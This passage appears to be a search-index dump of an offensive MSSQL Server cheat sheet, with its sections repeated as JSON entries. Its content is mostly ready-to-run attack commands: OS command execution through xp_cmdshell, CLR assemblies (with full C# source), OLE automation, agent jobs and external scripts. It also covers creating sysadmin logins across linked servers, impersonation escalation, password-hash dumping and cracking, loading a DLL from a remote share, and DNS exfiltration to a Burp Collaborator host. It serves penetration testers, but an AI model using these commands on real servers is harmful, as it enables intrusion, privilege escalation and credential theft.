openquery(`\"<DatabaseLinkName>`\",'select name from sys.databases')\" -Verbose Determine All the Tables Names from a Selected Linked Database The result is TableName which feeds into following query Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')\" -Verbose Gather the Top 5 Columns from a Selected Linked Table The results are ColumnName and ColumnValue which feed into following query Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')\" -Verbose Gather Entries from a Selected Linked Column Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')\" -Verbose Command Execution via xp_cmdshell xp_cmdshell disabled by default since SQL Server 2005 PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command whoami # Creates and adds local user backup to the local administrators group: PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"net user backup Password1234 /add'\" -Verbose PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"net localgroup administrators backup /add\" -Verbose Manually execute the SQL query sql EXEC xp_cmdshell \"net user\"; EXEC master..xp_cmdshell 'whoami' EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005) sql EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; If the procedure was uninstalled sql sp_addextendedproc 'xp_cmdshell','xplog70.dll' Extended Stored Procedure Add the extended stored procedure and list extended stored procedures # Create evil DLL Create-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \"echo test > c:\\temp\\test.txt\" -ExportName xp_test # Load the DLL and call xp_test Get-SQLQuery -UserName sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"sp_addextendedproc 'xp_test', '\\\\10.10.0.1\\temp\\test.dll'\" Get-SQLQuery -UserName sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"EXEC xp_test\" # Listing existing Get-SQLStoredProcedureXP -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose Build a DLL using xp_evil_template.cpp Load the DLL sql -- can also be loaded from UNC path or Webdav sp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll' EXEC xp_calc sp_dropextendedproc 'xp_calc' CLR Assemblies Prerequisites: * sysadmin privileges * CREATE ASSEMBLY permission (or) * ALTER ASSEMBLY permission (or) The execution takes place with privileges of the service account . Execute commands using CLR assembly # Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string Create-SQLFileCLRDll -ProcedureName \"runcmd\" -OutFile runcmd -OutDir C:\\Users\\user\\Desktop # Execute command using CLR assembly Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command \"whoami\" -Verbose Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"whoami\" Verbose Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64>\" -Verbose # List all the stored procedures added using CLR Get-SQLStoredProcedureCLR -Instance <instance> -Verbose Manually creating a CLR DLL and importing it Create a C# DLL file with the following content, with the command : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.IO; using System.Diagnostics; using System.Text; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void cmd_exec (SqlString execCommand) { Process proc = new Process(); proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\"; proc.StartInfo.Arguments = string.Format(@\" /C {0}\", execCommand.Value); proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); // Create the record and specify the metadata for the columns. SqlDataRecord record = new SqlDataRecord(new SqlMetaData(\"output\", SqlDbType.NVarChar, 4000)); // Mark the beginning of the result set. SqlContext.Pipe.SendResultsStart(record); // Set values for each column in the row record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); // Send the row back to the client. SqlContext.Pipe.SendResultsRow(record); // Mark the end of the result set. SqlContext.Pipe.SendResultsEnd(); proc.WaitForExit(); proc.Close(); } }; Then follow these instructions: Enable show advanced options on the server sql sp_configure 'show advanced options',1; RECONFIGURE GO Enable CLR on the server sql sp_configure 'clr enabled',1 RECONFIGURE GO Import the assembly sql CREATE ASSEMBLY my_assembly FROM 'c:\\temp\\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE; Link the assembly to a stored procedure sql CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execute and clean sql cmd_exec \"whoami\" DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED] WITH PERMISSION_SET = UNSAFE GO OLE Automation :warning: Disabled by default The execution takes place with privileges of the service account . Execute commands using OLE automation procedures Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"whoami\" Verbose # Enable OLE Automation EXEC sp_configure 'show advanced options', 1 EXEC sp_configure reconfigure EXEC sp_configure 'OLE Automation Procedures', 1 EXEC sp_configure reconfigure # Execute commands DECLARE @execmd INT EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\\system32\\cmd.exe /c' # https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\\windows\\temp\\reciclador.dll' python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\\windows\\temp\\reciclador.dll' SQL> enable_ole SQL> upload reciclador.dll C:\\windows\\temp\\reciclador.dll Agent Jobs The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. :warning: Require sysadmin or SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole roles to create a job. Execute commands through SQL Agent Job service Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell e <base64encodedscript>\" -Verbose Subsystem Options: \u2013Subsystem CmdExec -SubSystem PowerShell \u2013Subsystem VBScript \u2013Subsystem Jscript USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval = 5 ; EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1'; -- delete EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1'; List All Jobs SELECT job_id, [name] FROM msdb.dbo.sysjobs; SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id Get-SQLAgentJob -Instance \"<DBSERVERNAME\\DBInstance>\" -username sa -Password Password1234 -Verbose External Scripts :warning: You need to enable external scripts . sp_configure 'external scripts enabled', 1; RECONFIGURE; Python: Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64encodedscript>\" -Verbose EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])' WITH RESULT SETS (([cmd_out] nvarchar(max))) R Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64encodedscript>\" -Verbose EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system(\"cmd.exe /c dir\",intern=T))' WITH RESULT SETS (([cmd_out] text)); GO @script=N'OutputDataSet <-data.frame(shell(\"dir\",intern=T))' Audit Checks Find and exploit impersonation opportunities Impersonate as: EXECUTE AS LOGIN = 'sa' Impersonate dbo with DB_OWNER sql SQL> select is_member('db_owner'); SQL> execute as user = 'dbo' SQL> SELECT is_srvrolemember('sysadmin') Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit -Verbose # impersonate sa account powerpick Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug Find databases that have been configured as trustworthy Invoke-SQLAuditPrivTrustworthy -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit -Verbose SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound. Invoke-SQLAuditPrivXpDirtree Invoke-SQLUncPathInjection Invoke-SQLAuditPrivXpFileexist Manual SQL Server Queries Query Current User & determine if the user is a sysadmin select suser_sname() Select system_user select is_srvrolemember('sysadmin') Current Role Select user Current DB select db_name() List all tables select table_name from information_schema.tables List all databases select name from master..sysdatabases All Logins on Server Select * from sys.server_principals where type_desc != 'SERVER_ROLE' All Database Users for a Database Select * from sys.database_principals where type_desc != 'database_role'; List All Sysadmins SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 List All Database Roles SELECT DB1.name AS DatabaseRoleName, isnull (DB2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DB1 ON DRM.role_principal_id = DB1.principal_id LEFT OUTER JOIN sys.database_principals AS DB2 ON DRM.member_principal_id = DB2.principal_id WHERE DB1.type = 'R' ORDER BY DB1.name; Effective Permissions from the Server select * from fn_my_permissions(null, 'server'); Effective Permissions from the Database SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE'); Find SQL Server Logins Which can be Impersonated for the Current Database select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate' Exploiting Impersonation SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') EXECUTE AS LOGIN = 'adminuser' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() Exploiting Nested Impersonation SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') EXECUTE AS LOGIN = 'stduser' SELECT SYSTEM_USER EXECUTE AS LOGIN = 'sa' SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() SELECT SYSTEM_USER MSSQL Accounts and Hashes MSSQL 2000: SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.) MSSQL 2005 SELECT name, password_hash FROM master.sys.sql_logins SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins Then crack passwords using Hashcat : hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force 131 MSSQL (2000) 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 132 MSSQL (2005) 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe 1731 MSSQL (2012, 2014) 0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375 References PowerUpSQL Cheat Sheet & SQL Server Queries - Leo Pitt PowerUpSQL Cheat Sheet - Scott Sutherland Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017 MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016","title":"MSSQL Server"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#mssql-server","text":"","title":"MSSQL Server"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#summary","text":"Identify Instances and Databases Discover Local SQL Server Instances Discover Domain SQL Server Instances Discover Remote SQL Server Instances Identify Encrypted databases Version Query Identify Sensitive Information Get Tables from a Specific Database Gather 5 Entries from Each Column Gather 5 Entries from a Specific Table Dump common information from server to files Linked Database Find Trusted Link Execute Query Through The Link Crawl Links for Instances in the Domain Crawl Links for a Specific Instance Query Version of Linked Database Execute Procedure on Linked Database Determine Names of Linked Databases Determine All the Tables Names from a Selected Linked Database Gather the Top 5 Columns from a Selected Linked Table Gather Entries from a Selected Linked Column Command Execution via xp_cmdshell Extended Stored Procedure Add the extended stored procedure and list extended stored procedures CLR Assemblies Execute commands using CLR assembly Manually creating a CLR DLL and importing it OLE Automation Execute commands using OLE automation procedures Agent Jobs Execute commands through SQL Agent Job service List All Jobs External Scripts Python R Audit Checks Find and exploit impersonation opportunities Find databases that have been configured as trustworthy Manual SQL Server Queries Query Current User & determine if the user is a sysadmin Current Role Current DB List all tables List all databases All Logins on Server All Database Users for a Database List All Sysadmins List All Database Roles Effective Permissions from the Server Effective Permissions from the Database Find SQL Server Logins Which can be Impersonated for the Current Database Exploiting Impersonation Exploiting Nested Impersonation MSSQL Accounts and Hashes References","title":"Summary"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#identify-instances-and-databases","text":"","title":"Identify Instances and Databases"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#discover-local-sql-server-instances","text":"Get-SQLInstanceLocal","title":"Discover Local SQL Server Instances"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#discover-domain-sql-server-instances","text":"Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults","title":"Discover Domain SQL Server Instances"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#discover-remote-sql-server-instances","text":"Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1","title":"Discover Remote SQL Server Instances"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#identify-encrypted-databases","text":"Note: These are automatically decrypted for admins Get-SQLDatabase -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose | Where-Object {$_.is_encrypted -eq \"True\"}","title":"Identify Encrypted databases"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#version-query","text":"Get-SQLInstanceDomain | Get-Query \"select @@version\"","title":"Version Query"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#identify-sensitive-information","text":"","title":"Identify Sensitive Information"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#get-tables-from-a-specific-database","text":"Get-SQLInstanceDomain | Get-SQLTable -DatabaseName <DBNameFromGet-SQLDatabaseCommand> -NoDefaults Get Column Details from a Table Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName <DBName> -TableName <TableName>","title":"Get Tables from a Specific Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-5-entries-from-each-column","text":"Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords \"<columnname1,columnname2,columnname3,columnname4,columnname5>\" -Verbose -SampleSize 5","title":"Gather 5 Entries from Each Column"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-5-entries-from-a-specific-table","text":"Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query 'select TOP 5 * from <DatabaseName>.dbo.<TableName>'","title":"Gather 5 Entries from a Specific Table"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#dump-common-information-from-server-to-files","text":"Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv","title":"Dump common information from server to files"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#linked-database","text":"","title":"Linked Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-trusted-link","text":"select * from master..sysservers","title":"Find Trusted Link"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-query-through-the-link","text":"-- execute query through the link select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers') select version from openquery(\"linkedserver\", 'select @@version as version'); -- chain multiple openquery select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")') -- execute shell commands EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"') -- create user and give admin privileges EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"","title":"Execute Query Through The Link"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#crawl-links-for-instances-in-the-domain","text":"A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results Get-SQLInstanceDomain | Get-SQLServerLink -Verbose select * from master..sysservers","title":"Crawl Links for Instances in the Domain"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#crawl-links-for-a-specific-instance","text":"Get-SQLServerLinkCrawl -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose select * from openquery(\"<instance>\",'select * from openquery(\"<instance2>\",''select * from master..sysservers'')')","title":"Crawl Links for a Specific Instance"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#query-version-of-linked-database","text":"Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DBSERVERNAME\\DBInstance>`\",'select @@version')\" -Verbose","title":"Query Version of Linked Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-procedure-on-linked-database","text":"SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at \"linked.database.local\"; SQL> EXECUTE('RECONFIGURE') at \"linked.database.local\"; SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at \"linked.database.local\"; SQL> EXECUTE('RECONFIGURE') at \"linked.database.local\"; SQL> EXECUTE('exec xp_cmdshell whoami') at \"linked.database.local\";","title":"Execute Procedure on Linked Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#determine-names-of-linked-databases","text":"tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query. Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\",'select name from sys.databases')\" -Verbose","title":"Determine Names of Linked Databases"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#determine-all-the-tables-names-from-a-selected-linked-database","text":"The result is TableName which feeds into following query Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')\" -Verbose","title":"Determine All the Tables Names from a Selected Linked Database"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-the-top-5-columns-from-a-selected-linked-table","text":"The results are ColumnName and ColumnValue which feed into following query Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')\" -Verbose","title":"Gather the Top 5 Columns from a Selected Linked Table"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-entries-from-a-selected-linked-column","text":"Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DatabaseLinkName>`\"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')\" -Verbose","title":"Gather Entries from a Selected Linked Column"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#command-execution-via-xp_cmdshell","text":"xp_cmdshell disabled by default since SQL Server 2005 PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command whoami # Creates and adds local user backup to the local administrators group: PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"net user backup Password1234 /add'\" -Verbose PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"net localgroup administrators backup /add\" -Verbose Manually execute the SQL query sql EXEC xp_cmdshell \"net user\"; EXEC master..xp_cmdshell 'whoami' EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005) sql EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; If the procedure was uninstalled sql sp_addextendedproc 'xp_cmdshell','xplog70.dll'","title":"Command Execution via xp_cmdshell"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#extended-stored-procedure","text":"","title":"Extended Stored Procedure"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#add-the-extended-stored-procedure-and-list-extended-stored-procedures","text":"# Create evil DLL Create-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \"echo test > c:\\temp\\test.txt\" -ExportName xp_test # Load the DLL and call xp_test Get-SQLQuery -UserName sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"sp_addextendedproc 'xp_test', '\\\\10.10.0.1\\temp\\test.dll'\" Get-SQLQuery -UserName sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"EXEC xp_test\" # Listing existing Get-SQLStoredProcedureXP -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose Build a DLL using xp_evil_template.cpp Load the DLL sql -- can also be loaded from UNC path or Webdav sp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll' EXEC xp_calc sp_dropextendedproc 'xp_calc'","title":"Add the extended stored procedure and list extended stored procedures"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#clr-assemblies","text":"Prerequisites: * sysadmin privileges * CREATE ASSEMBLY permission (or) * ALTER ASSEMBLY permission (or) The execution takes place with privileges of the service account .","title":"CLR Assemblies"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-commands-using-clr-assembly","text":"# Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string Create-SQLFileCLRDll -ProcedureName \"runcmd\" -OutFile runcmd -OutDir C:\\Users\\user\\Desktop # Execute command using CLR assembly Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command \"whoami\" -Verbose Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"whoami\" Verbose Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64>\" -Verbose # List all the stored procedures added using CLR Get-SQLStoredProcedureCLR -Instance <instance> -Verbose","title":"Execute commands using CLR assembly"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#manually-creating-a-clr-dll-and-importing-it","text":"Create a C# DLL file with the following content, with the command : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.IO; using System.Diagnostics; using System.Text; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void cmd_exec (SqlString execCommand) { Process proc = new Process(); proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\"; proc.StartInfo.Arguments = string.Format(@\" /C {0}\", execCommand.Value); proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); // Create the record and specify the metadata for the columns. SqlDataRecord record = new SqlDataRecord(new SqlMetaData(\"output\", SqlDbType.NVarChar, 4000)); // Mark the beginning of the result set. SqlContext.Pipe.SendResultsStart(record); // Set values for each column in the row record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); // Send the row back to the client. SqlContext.Pipe.SendResultsRow(record); // Mark the end of the result set. SqlContext.Pipe.SendResultsEnd(); proc.WaitForExit(); proc.Close(); } }; Then follow these instructions: Enable show advanced options on the server sql sp_configure 'show advanced options',1; RECONFIGURE GO Enable CLR on the server sql sp_configure 'clr enabled',1 RECONFIGURE GO Import the assembly sql CREATE ASSEMBLY my_assembly FROM 'c:\\temp\\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE; Link the assembly to a stored procedure sql CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execute and clean sql cmd_exec \"whoami\" DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED] WITH PERMISSION_SET = UNSAFE GO","title":"Manually creating a CLR DLL and importing it"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#ole-automation","text":":warning: Disabled by default The execution takes place with privileges of the service account .","title":"OLE Automation"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-commands-using-ole-automation-procedures","text":"Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"whoami\" Verbose # Enable OLE Automation EXEC sp_configure 'show advanced options', 1 EXEC sp_configure reconfigure EXEC sp_configure 'OLE Automation Procedures', 1 EXEC sp_configure reconfigure # Execute commands DECLARE @execmd INT EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\\system32\\cmd.exe /c' # https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\\windows\\temp\\reciclador.dll' python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\\windows\\temp\\reciclador.dll' SQL> enable_ole SQL> upload reciclador.dll C:\\windows\\temp\\reciclador.dll","title":"Execute commands using OLE automation procedures"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#agent-jobs","text":"The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. :warning: Require sysadmin or SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole roles to create a job.","title":"Agent Jobs"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-commands-through-sql-agent-job-service","text":"Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell e <base64encodedscript>\" -Verbose Subsystem Options: \u2013Subsystem CmdExec -SubSystem PowerShell \u2013Subsystem VBScript \u2013Subsystem Jscript USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval = 5 ; EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job 